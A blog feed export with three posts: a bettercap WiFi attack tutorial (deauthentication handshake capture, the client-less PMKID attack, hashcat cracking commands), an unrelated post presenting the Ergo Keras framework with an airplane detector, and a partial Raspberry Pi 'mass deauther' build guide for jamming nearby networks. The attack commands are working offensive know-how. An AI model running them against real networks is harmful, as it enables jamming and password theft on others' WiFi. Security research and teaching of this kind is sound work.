<p>If everything worked as expected and you’re close enough to the AP and the clients, bettercap will start informing you that complete handshakes have been captured (you can customize the pcap file output by changing the <code>wifi.handshakes.file</code> parameter):</p>
<p><img src="/images/2019/02/deauth.png" alt="deauth"></p>
<div class="note">Not only bettercap will check for complete handshakes and dump them only when all the required packets have been captured, but it will also append to the file one beacon packet for each AP, in order to allow any tool reading the pcap to detect both the BSSIDs and the ESSIDs.<br></div>

<p>The downsides of this attack are obvious: no clients = no party, moreover, given we need to wait for at least one of them to reconnect, it can potentially take some time.</p>
<h3 id="4-way-Handshake-Cracking"><a href="#4-way-Handshake-Cracking" class="headerlink" title="4-way Handshake Cracking"></a>4-way Handshake Cracking</h3><p>Once we have succesfully captured the EAPOL frames required by hashcat in order to crack the PSK, we’ll need to convert the <code>pcap</code> output file to the <code>hccapx</code> format that hashcat can read. In order to do so, we can either use <a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">this online service</a>, or install the <a href="https://github.com/hashcat/hashcat-utils" target="_blank" rel="noopener">hashcat-utils</a> ourselves and convert the file locally:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx</span><br></pre></td></tr></table></figure>
<p>You can now proceed to crack the handshake(s) either by dictionary attack or brute-force. For instance, to try all 8-digits combinations:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx <span class="string">'?d?d?d?d?d?d?d?d'</span></span><br></pre></td></tr></table></figure>
<p>And this is it, the evergreen deauthentication attack in all its simplicity, performed with just one tool … let’s get to the fun part now :)</p>
<h3 id="Client-less-PMKID-Attack"><a href="#Client-less-PMKID-Attack" class="headerlink" title="Client-less PMKID Attack"></a>Client-less PMKID Attack</h3><p>In 2018 hashcat authors <a href="https://hashcat.net/forum/thread-7717.html" target="_blank" rel="noopener">disclosed</a> a new type of attack which not only relies <strong>on one single packet</strong>, but it doesn’t require any clients to be connected to our target AP or, if clients are connected, it doesn’t require us to send deauth frames to them, there’s no interaction between the attacker and client stations, but just between the attacker and the AP, interaction which, if the router is vulnerable, is almost immediate!</p>
<p>It turns out that <strong>a lot</strong> of modern routers append an optional field at the end of the first EAPOL frame sent by the AP itself when someone is associating, the so called <code>Robust Security Network</code>, which includes something called <code>PMKID</code>:</p>
<p><img src="/images/2019/02/pmkid.png" alt="pmkid"></p>
<p>As explained in the original post, the PMKID is derived by using data which is known to us:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PMKID = HMAC-SHA1-128(PMK, &quot;PMK Name&quot; | MAC_AP | MAC_STA)</span><br></pre></td></tr></table></figure>
<p>Since the “PMK Name” string is constant, we know both the BSSID of the AP and the station and the <code>PMK</code> is the same one obtained from a full 4-way handshake, this is all hashcat needs in order to crack the PSK and recover the passphrase! Here’s where the new <code>wifi.assoc</code> command comes into play: instead of deauthenticating existing clients as shown in the previous attack and waiting for the full handshake to be captured, we’ll simply start to associate with the target AP and listen for an EAPOL frame containing the RSN PMKID data. </p>
<p>Say we’re still listening on channel 1 (since we previously <code>wifi.recon.channel 1</code>), let’s send such association request to every AP and see who’ll respond with useful information:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth</span></span><br><span class="line">&gt; wifi.assoc all</span><br></pre></td></tr></table></figure>
<p>All nearby vulnerable routers (and let me reiterate: <strong>a lot</strong> of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file:</p>
<p><img src="/images/2019/02/wifi_assoc.jpg" alt="assoc"></p>
<h3 id="PMKID-Cracking"><a href="#PMKID-Cracking" class="headerlink" title="PMKID Cracking"></a>PMKID Cracking</h3><p>We’ll now need to convert the PMKID data in the pcap file we just captured to a hash format that hashcat can understand, for this we’ll use <a href="https://github.com/ZerBea/hcxtools" target="_blank" rel="noopener">hcxpcaptool</a>:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap</span><br></pre></td></tr></table></figure>
<p>We can now proceed cracking the <code>bettercap-wifi.handshake.pmkid</code> file so generated by using algorithm number <code>16800</code>:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid <span class="string">'?d?d?d?d?d?d?d?d'</span></span><br></pre></td></tr></table></figure>
<h3 id="Recap"><a href="#Recap" class="headerlink" title="Recap"></a>Recap</h3><ul>
<li>Goodbye airmon, airodump, aireplay and whatnots: one tool to rule them all!</li>
<li>Goodbye Kali VMs on macOS: these modules work natively out of the box, with the default Apple hardware &lt;3</li>
<li>Full 4-way handshakes are for n00bs: just one association request and most routers will send us enough key material.</li>
</ul>
<p>Enjoy :)</p>
<p><img src="/images/2019/02/lulz.png" alt="lulz"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;In this post, I’ll talk about the new WiFi related features that have been recently implemented into bettercap, starting from how the EAPOL &lt;a href=&quot;https://wlan1nde.wordpress.com/2014/10/27/4-way-handshake/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;4-way handshake&lt;/a&gt; capturing has been automated, to a whole new type of attack that will allow us to recover WPA PSK passwords of an AP without clients.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/bettercap/media/master/logo.png&quot; alt=&quot;logo&quot;&gt;&lt;/p&gt;
&lt;p&gt;We’ll start with the assumption that your WiFi card supports monitor mode and packet injection (I use an &lt;code&gt;AWUS1900&lt;/code&gt; with &lt;a href=&quot;https://github.com/aircrack-ng/rtl8812au&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;this driver&lt;/a&gt;), that you have a working &lt;a href=&quot;https://hashcat.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hashcat&lt;/a&gt; (v4.2.0 or higher is required) installation (ideally with GPU support enabled) for cracking and that you know how to use it properly either for dictionary or brute-force attacks, as no tips on how to tune the masks and/or generate proper dictionaries will be given :)&lt;/p&gt;
&lt;div class=&quot;note&quot;&gt;On newer macOS laptops, the builtin WiFi interface &lt;code&gt;en0&lt;/code&gt; already supports monitor mode, meaning you won’t need a Linux VM in order to run this :)&lt;/div&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="deauth" scheme="https://www.evilsocket.net/tags/deauth/"/>
    
      <category term="pmkid" scheme="https://www.evilsocket.net/tags/pmkid/"/>
    
      <category term="rsn pmkid" scheme="https://www.evilsocket.net/tags/rsn-pmkid/"/>
    
      <category term="rsn" scheme="https://www.evilsocket.net/tags/rsn/"/>
    
      <category term="hashcat" scheme="https://www.evilsocket.net/tags/hashcat/"/>
    
      <category term="handshake" scheme="https://www.evilsocket.net/tags/handshake/"/>
    
      <category term="wpa" scheme="https://www.evilsocket.net/tags/wpa/"/>
    
      <category term="wpa2" scheme="https://www.evilsocket.net/tags/wpa2/"/>
    
  </entry>
  
  <entry>
    <title>Presenting Project Ergo: How to Build an Airplane Detector for Satellite Imagery With Deep Learning</title>
    <link href="https://www.evilsocket.net/2018/11/22/Presenting-project-Ergo-how-to-build-an-airplane-detector-for-satellite-imagery-with-Deep-Learning/"/>
    <id>https://www.evilsocket.net/2018/11/22/Presenting-project-Ergo-how-to-build-an-airplane-detector-for-satellite-imagery-with-Deep-Learning/</id>
    <published>2018-11-22T17:15:50.000Z</published>
    <updated>2019-10-19T08:14:27.110Z</updated>
    
    <content type="html"><![CDATA[<p>It’s been a while that i’ve been quite intensively playing with <a href="https://blogs.nvidia.com/blog/2016/07/29/whats-difference-artificial-intelligence-machine-learning-deep-learning-ai/" target="_blank" rel="noopener">Deep Learning</a> both for work related research and personal projects. More specifically, I’ve been using the <a href="https://keras.io/" target="_blank" rel="noopener">Keras framework</a> on top of a <a href="https://www.tensorflow.org/" target="_blank" rel="noopener">TensorFlow</a> backend for all sorts of stuff. From big and complex projects for malware detection, to smaller and simpler experiments about ideas i just wanted to quickly implement and test - it didn’t really matter the scope of the project, I always found myself struggling with the same issues: code reuse over tens of crap python and shell scripts, datasets and models that are spread all over my dev and prod servers, no real standard for versioning them, no order, no structure. </p>
<p>So a few days ago I started writing what it was initially meant to be just a simple wrapper for the main commands of my training pipelines but quickly became a full-fledged framework and manager for all my Keras based projects.</p>
<p align="center"><br>  <img alt="ergo" src="https://i.imgur.com/EO9PdNp.jpg"><br></p>

<p>Today I’m pleased to open source and present <a href="https://github.com/evilsocket/ergo" target="_blank" rel="noopener">project Ergo</a> by showcasing an example use-case: we’ll prototype, train and test a <a href="https://medium.freecodecamp.org/an-intuitive-guide-to-convolutional-neural-networks-260c2de0a050?gi=bf04ca9f8061" target="_blank" rel="noopener">Convolutional Neural Network</a> on top of the <a href="https://www.kaggle.com/rhammell/planesnet" target="_blank" rel="noopener">PlanesNet</a> raw dataset in order to build an airplane detector for satellite imagery.</p>
<center><br>    <img src="https://i.imgur.com/sFfGMcS.png"><br></center>

<a id="more"></a>
<p><em>This image and the general idea were taken from <a href="https://github.com/rhammell/planesnet-detector" target="_blank" rel="noopener">this project</a>, however the model structure, training algorithm and data preprocessing are different … the point of this post is, as i said, to showcase Ergo with something which is less of a clichè than the handwritten digits recognition problem with the <a href="http://yann.lecun.com/exdb/mnist/" target="_blank" rel="noopener">MNIST database</a>.</em></p>
<h2 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h2><p>First thing first, you’ll need <code>python3</code> and <code>pip3</code>, download Ergo’s <a href="https://github.com/evilsocket/ergo/releases" target="_blank" rel="noopener">latest stable release from GitHub</a>, extract it somewhere on your disk and:</p>
<pre><code>cd /path/to/ergo
sudo pip3 install -r requirements.txt
python3 setup.py build
sudo python3 setup.py install
</code></pre><p>If you’re interested in visualizing the model and training metrics, you’ll also need to:</p>
<pre><code>sudo apt-get install graphviz python3-tk
</code></pre><p>This way you’ll have installed all the dependencies, including the default version of TensorFlow which runs on CPU. Since our training dataset will be relatively big and our model moderately complex, we might want to use GPUs instead. In order to do so, make sure you have <a href="https://medium.com/@zhanwenchen/install-cuda-and-cudnn-for-tensorflow-gpu-on-ubuntu-79306e4ac04e" target="_blank" rel="noopener">CUDA 9.0 and cuDNN 7.0</a> installed and then:</p>
<pre><code>sudo pip3 uninstall tensorflow
sudo pip3 install tensorflow-gpu
</code></pre><p>If everything worked correctly, you’ll be able test your GPU setup, the software versions and what hardware is available with the <code>nvidia-smi</code> and <code>ergo info</code> commands. For example, on my home training server this is the output:</p>
<center><br>    <img alt="ergo info" src="https://i.imgur.com/blcaser.png"><br></center>

<h2 id="Airplanes-and-Satellites"><a href="#Airplanes-and-Satellites" class="headerlink" title="Airplanes and Satellites"></a>Airplanes and Satellites</h2><p>Now it’s time to grab our dataset, download the <a href="https://www.kaggle.com/rhammell/planesnet#planesnet.zip" target="_blank" rel="noopener">planesnet.zip file from Kaggle</a> and extract it somewhere on your disk, we will only need the folder filled with PNG files, each one named as <code>1__20160714_165520_0c59__-118.4316008_33.937964191.png</code>, where the first <code>1__</code> or <code>0__</code> tells us the labeling (0=no plane, 1=there’s a plane).</p>
<p>We’ll feed our system with the raw images, preprocess them and train a CNN on top of those labeled vectors next.</p>
<h2 id="Data-Preprocessing"><a href="#Data-Preprocessing" class="headerlink" title="Data Preprocessing"></a>Data Preprocessing</h2><p>Normally we would start a new Ergo project by issuing the <code>ergo create planes-detector</code> command, this would create a new folder named <code>planes-detector</code> with three files in it:</p>
<ol>
<li><code>prepare.py</code>, that we will customize to preprocess the dataset </li>
<li><code>model.py</code>, where we will customize the model.</li>
<li><code>train.py</code>, for the training algorithm.</li>
</ol>
<p>These files would be filled with some default code and only a minimum amount of changes would be needed in order to implement our experiment, changes that I already made available on <a href="https://github.com/evilsocket/ergo-planes-detector" target="_blank" rel="noopener">the planes-detector repo on GitHub</a>.</p>
<p>The format that by default Ergo expects the dataset to be is a CSV file, where each row is composed as <code>y,x0,x1,x2,....</code> (<code>y</code> being the label and <code>xn</code> the scalars in the input vector), but our inputs are images, which have a width, a height and a RGB depth. In order to transform these 3-dimensional tensors into a flat vector that Ergo understands, we need to customize the <code>prepare.py</code> script to do some data preprocessing.</p>
<script src="https://gist-it.appspot.com/https://github.com/evilsocket/ergo-planes-detector/blob/master/prepare.py"></script>

<p>This will loop all the pictures and flatten them to vectors of 1200 elements each (20x20x3), plus the <code>y</code> scalar (the label) at the beginning, and eventually return a <code>panda.DataFrame</code> that Ergo will now digest.</p>
<h2 id="The-Model"><a href="#The-Model" class="headerlink" title="The Model"></a>The Model</h2><p>This is not a post about how convolutional neural networks (or neural networks at all) work so I won’t go into details about that, chances are that if you have the type of technical problems that Ergo solves, you know already. In short, CNNs can encode visual/spatial patterns from input images and use them as features in order to predict things like <code>how much this image looks like a cat</code> … or a plane :) TLDR: CNNs are great for images.</p>
<p>This is how our <code>model.py</code> looks like:</p>
<script src="https://gist-it.appspot.com/https://github.com/evilsocket/ergo-planes-detector/blob/master/model.py"></script>

<p>Other than <code>reshaping</code> the flat input back to the 3-dimensional shape that our convolutional layers understand, two <a href="https://www.tensorflow.org/api_docs/python/tf/keras/layers/Conv2D" target="_blank" rel="noopener">convolutional layers</a> with respectively 32 and 64 filters with a 3x3 kernel are present, plus the usual suspects that help us getting more accurate results after training (<code>MaxPooling2D</code> to pick the best visual features and a couple of <code>Dropout</code> filter layers to avoid <a href="https://en.wikipedia.org/wiki/Overfitting" target="_blank" rel="noopener">overfitting</a>) and the <code>Dense</code> hidden and output layers. Pretty standard model for simple image recognition problems.</p>
<h2 id="The-Training"><a href="#The-Training" class="headerlink" title="The Training"></a>The Training</h2><p>We can finally start talking about training. The <code>train.py</code> file was almost left unchanged and I only added a few lines to integrate it with <a href="https://www.tensorflow.org/guide/summaries_and_tensorboard" target="_blank" rel="noopener">TensorBoard</a>.</p>
<script src="https://gist-it.appspot.com/https://github.com/evilsocket/ergo-planes-detector/blob/master/train.py"></script>

<p>The data preprocessing, import and training process can now be started with:</p>
<pre><code>ergo train /path/to/planes-detector-project --dataset /path/to/planesnet-pictures
</code></pre><p>If running on multiple GPUs, you can use the <code>--gpus N</code> optional argument to detemine how many to use, while the <code>--test N</code> and <code>--validation N</code> arguments can be used to partition the dataset (by default both test and validation sets will be 15% of the global one, while the rest will be used for training).</p>
<p>Depending on your hardware configuration this process can take from a few minutes, up to even hours (remember you can monitor it with <code>tensorboard --log_dir=/path/to/planes-detector-project/logs</code>), but eventually you will see something like:</p>
<center><br>    <img alt="training" src="https://i.imgur.com/foFQrba.png"><br></center>

<p>Other than manually inspecting the model yaml file, and some <code>model.stats</code>, you can now:</p>
<pre><code>ergo view /path/to/planes-detector-project
</code></pre><p>to see the model structure, the <code>accuracy</code> and <code>loss</code> metrics during training and validation:</p>
<center><br>    <img alt="ergo view" src="https://i.imgur.com/rUQ1Het.png"><br></center>

<p><strong>Not bad!</strong> Over 98% accuracy on a dataset of thousands of images! </p>
<p>We can now clean the project from the temporary train, validation and test datasets:</p>
<pre><code>ergo clean /path/to/planes-detector-project
</code></pre><h2 id="Using-the-Model"><a href="#Using-the-Model" class="headerlink" title="Using the Model"></a>Using the Model</h2><p>It is possible now to load the trained weights <code>model.h5</code> file in your own project and use it as you like, for instance you might use a sliding window of 20x20 pixels on a bigger image and mark the areas that this NN detected as planes. Another option is to use Ergo itself and expose the model as a REST API:</p>
<pre><code>ergo serve /path/to/planes-detector-project
</code></pre><p>You’ll be able to access and test the model predictions via a simple:</p>
<pre><code>curl http://127.0.0.1:8080/?x=0.345,1.0,0.9,....
</code></pre><p>__<br>As usual, <strong>enjoy</strong> &lt;3</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;It’s been a while that i’ve been quite intensively playing with &lt;a href=&quot;https://blogs.nvidia.com/blog/2016/07/29/whats-difference-artificial-intelligence-machine-learning-deep-learning-ai/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Deep Learning&lt;/a&gt; both for work related research and personal projects. More specifically, I’ve been using the &lt;a href=&quot;https://keras.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Keras framework&lt;/a&gt; on top of a &lt;a href=&quot;https://www.tensorflow.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;TensorFlow&lt;/a&gt; backend for all sorts of stuff. From big and complex projects for malware detection, to smaller and simpler experiments about ideas i just wanted to quickly implement and test - it didn’t really matter the scope of the project, I always found myself struggling with the same issues: code reuse over tens of crap python and shell scripts, datasets and models that are spread all over my dev and prod servers, no real standard for versioning them, no order, no structure. &lt;/p&gt;
&lt;p&gt;So a few days ago I started writing what it was initially meant to be just a simple wrapper for the main commands of my training pipelines but quickly became a full-fledged framework and manager for all my Keras based projects.&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;br&gt;  &lt;img alt=&quot;ergo&quot; src=&quot;https://i.imgur.com/EO9PdNp.jpg&quot;&gt;&lt;br&gt;&lt;/p&gt;

&lt;p&gt;Today I’m pleased to open source and present &lt;a href=&quot;https://github.com/evilsocket/ergo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;project Ergo&lt;/a&gt; by showcasing an example use-case: we’ll prototype, train and test a &lt;a href=&quot;https://medium.freecodecamp.org/an-intuitive-guide-to-convolutional-neural-networks-260c2de0a050?gi=bf04ca9f8061&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Convolutional Neural Network&lt;/a&gt; on top of the &lt;a href=&quot;https://www.kaggle.com/rhammell/planesnet&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PlanesNet&lt;/a&gt; raw dataset in order to build an airplane detector for satellite imagery.&lt;/p&gt;
&lt;center&gt;&lt;br&gt;    &lt;img src=&quot;https://i.imgur.com/sFfGMcS.png&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="ergo" scheme="https://www.evilsocket.net/tags/ergo/"/>
    
      <category term="keras" scheme="https://www.evilsocket.net/tags/keras/"/>
    
      <category term="tensorflow" scheme="https://www.evilsocket.net/tags/tensorflow/"/>
    
      <category term="tf" scheme="https://www.evilsocket.net/tags/tf/"/>
    
      <category term="deep learning" scheme="https://www.evilsocket.net/tags/deep-learning/"/>
    
      <category term="dnn" scheme="https://www.evilsocket.net/tags/dnn/"/>
    
      <category term="machine learning" scheme="https://www.evilsocket.net/tags/machine-learning/"/>
    
      <category term="neural networks" scheme="https://www.evilsocket.net/tags/neural-networks/"/>
    
      <category term="deep neural networks" scheme="https://www.evilsocket.net/tags/deep-neural-networks/"/>
    
      <category term="cuda" scheme="https://www.evilsocket.net/tags/cuda/"/>
    
      <category term="nvidia" scheme="https://www.evilsocket.net/tags/nvidia/"/>
    
      <category term="convolutional neural networks" scheme="https://www.evilsocket.net/tags/convolutional-neural-networks/"/>
    
      <category term="cnn" scheme="https://www.evilsocket.net/tags/cnn/"/>
    
      <category term="cudnn" scheme="https://www.evilsocket.net/tags/cudnn/"/>
    
      <category term="planes detector" scheme="https://www.evilsocket.net/tags/planes-detector/"/>
    
      <category term="planes" scheme="https://www.evilsocket.net/tags/planes/"/>
    
      <category term="planesnet" scheme="https://www.evilsocket.net/tags/planesnet/"/>
    
  </entry>
  
  <entry>
    <title>Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W</title>
    <link href="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/"/>
    <id>https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/</id>
    <published>2018-07-28T17:01:56.000Z</published>
    <updated>2019-10-19T08:14:27.111Z</updated>
    
    <content type="html"><![CDATA[<p>A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting “side effect” of this jammer (the initial intent was <em>purely for the lulz</em>) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.</p>
<p>Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given <a href="https://twitter.com/evilsocket/status/1021367629901115392" target="_blank" rel="noopener">the interest the tweet had</a> I thought to share this writeup :)</p>
<p><img src="/images/2018/07/deauth.png" alt="deauth"></p>
<center><small><i>This awesome case has been designed by <a href="https://twitter.com/elkentaro" target="_blank">@elkentaro</a> and can be found on <a href="https://www.thingiverse.com/thing:3018480" target="_blank" rel="noopener">his Thingverse page</a>.</i></small></center>

<a id="more"></a>
<h3 id="0x00-FAQ"><a href="#0x00-FAQ" class="headerlink" title="[0x00] FAQ"></a>[0x00] FAQ</h3><p><strong>Why not using Nethunter or some other Kali image for Android and a smartphone instead?</strong></p>
<p>Monitor mode works, injection doesn’t. Using an external WiFi makes the whole thing bigger and kills the battery.</p>
<p><strong>Why not using … instead?</strong></p>
<p>There are many alternatives to the setup I’m going to describe, it’s not necessarily the best, just the one that works for me.</p>
<p><strong>Why …?</strong></p>
<p>BECAUSE. The point of this post is not just the hardware, but mostly how to use bettercap to attack wifi.</p>
<h3 id="0x01-Kali-image-and-initial-headless-configuration"><a href="#0x01-Kali-image-and-initial-headless-configuration" class="headerlink" title="[0x01] Kali image and initial headless configuration."></a>[0x01] Kali image and initial headless configuration.</h3><p>First thing first, you’ll need to download the <strong>Kali Linux Rpi0w Nexmon</strong> image from <a href="https://www.offensive-security.com/kali-linux-arm-images/" target="_blank" rel="noopener">this page</a> and burn it to the uSD card you’re going to use for the rpi using the usual <code>dd</code> method, but before unmounting it, we need to enable SSH at boot and configure it to connect to our home WiFi network for the initial configuration, keep in mind this is just temporary and the main wifi interface will be used for packet injection later, while we will be able to connect via bluetooth to the board.</p>
<p>From the computer you used to burn the image on your micro sd, mount it again if needed and then:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will enable ssh at boot</span></span><br><span class="line">touch /sd-mount-point/boot/ssh</span><br><span class="line"><span class="comment"># let's setup wlan0</span></span><br><span class="line">nano /sd-mount-point/etc/network/interfaces</span><br></pre></td></tr></table></figure>
<p>Fill this file with the following contents:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line"></span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</span><br><span class="line">iface default inet dhcp</span><br></pre></td></tr></table></figure>
<p>Now we’ll add the details of the WiFi network we want the rpi to connect automatically for configuration:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /sd-mount-point/etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>
<p>And add this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">country=GB</span><br><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">        ssid=&quot;YourWiFiName&quot;</span><br><span class="line">        psk=&quot;y0urw1f!p455w0rd&quot;</span><br><span class="line">        key_mgmt=WPA-PSK</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Reboot the RPI and it should connect to your WiFi, search for its IP address (either by broadcast ping, or using bettercap itself, i usually use the <a href="https://github.com/bettercap/caplets/blob/master/netmon.cap" target="_blank" rel="noopener">netmon</a> caplet to see what’s going on on my network) and finally SSH to it using the default Kali credentials:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will allow you to login with your SSH key instead of a password</span></span><br><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub root@pita-ip</span><br><span class="line">ssh root@pita-ip</span><br></pre></td></tr></table></figure>
<p>Once you’re logged in:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># always change the default root password</span></span><br><span class="line">passwd</span><br><span class="line"><span class="comment"># regenerate ssh keys</span></span><br><span class="line">ssh-keygen</span><br><span class="line"><span class="comment"># set a nicer hostname :D</span></span><br><span class="line">hostname -b pita</span><br><span class="line"><span class="built_in">echo</span> pita &gt; /etc/hostname</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"127.0.0.1 pita"</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="comment"># update the system</span></span><br><span class="line">apt update </span><br><span class="line">apt upgrade</span><br><span class="line"><span class="comment"># install a few useful packages and setup swap</span></span><br><span class="line">apt install git dphys-swapfile</span><br><span class="line"><span class="comment"># set CONF_SWAPSIZE to 1024</span></span><br><span class="line">nano /etc/dphys-swapfile</span><br><span class="line">systemctl <span class="built_in">enable</span> dphys-swapfile</span><br><span class="line"><span class="comment"># set the correct timezone</span></span><br><span class="line">dpkg-reconfigure tzdata</span><br><span class="line"><span class="comment"># reboot to apply the effects</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<h3 id="0x02-Connecting-via-Bluetooth-with-bt-nap"><a href="#0x02-Connecting-via-Bluetooth-with-bt-nap" class="headerlink" title="[0x02] Connecting via Bluetooth with bt-nap"></a>[0x02] Connecting via Bluetooth with bt-nap</h3><p>We want to use <code>wlan0</code> for the monitor mode and injection using Nexmon, meaning we need another way to connect to our board. For this, we can setup the rpi to work as a bt-nap server, basically you will be able to connect via bluetooth and reach it with an IP address on that bluetooth connection, this works both from a laptop and from a smartphone as well.</p>
<center><br><blockquote class="twitter-tweet" data-conversation="none" data-lang="it"><p lang="en" dir="ltr">Power from your smartphone, ssh over bluetooth and a mass deauther in your pocket 😈<a href="https://twitter.com/bettercap?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">@bettercap</a> + <a href="https://twitter.com/hashtag/pita?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#pita</a> = ❤️ <a href="https://t.co/lDn9Tie3W9" target="_blank" rel="noopener">pic.twitter.com/lDn9Tie3W9</a></p>&mdash; 👽 (@evilsocket) <a href="https://twitter.com/evilsocket/status/1021378841749721091?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">23 luglio 2018</a></blockquote><br><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<p>Let’s connect once more via WiFi and SSH:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh root@pita-ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># install a few dependencies</span></span><br><span class="line">apt install pulseaudio pulseaudio-module-zeroconf alsa-utils avahi-daemon pulseaudio-module-bluetooth</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/bablokb/pi-btnap.git</span><br><span class="line"><span class="comment"># install btnap as a server</span></span><br><span class="line">./pi-btnap/tools/install-btnap server</span><br></pre></td></tr></table></figure>
<p>Fix the bluetooth configuration file <code>/etc/systemd/system/bluetooth.target.wants/bluetooth.service</code> by disabling the SAP plugin that would break bluetooth, change the <code>ExecStart</code> part with:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=/usr/lib/bluetooth/bluetoothd --noplugin=sap</span><br></pre></td></tr></table></figure>
<p>Let’s set the bluetooth name of your device by editing <code>/etc/bluetooth/main.conf</code> and finally edit the btnap configuration file itself, <code>/etc/btnap.conf</code>:</p>
